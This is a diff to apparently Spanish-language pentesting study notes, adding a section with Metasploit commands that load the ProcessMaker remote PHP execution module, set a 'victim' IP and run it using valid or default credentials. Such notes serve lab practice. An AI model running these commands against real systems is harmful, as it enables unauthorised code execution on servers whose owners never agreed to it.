@@ -41,6 +41,18 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 	❯ exploit
 ```
 
+## ProcessMaker
+
+```bash 
+# Sirve para ejecutar codigo PHP, necesitamos credenciales validas o que las de default logren entrar
+❯ msfconsole -q                                    # q = Quitar el banner de inicio
+
+	❯ use exploit/multi/http/processmaker_exec    # Usamos el exploit
+	❯ options
+	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ exploit 
+```
+
 ## WebDAV
 
 ```bash 
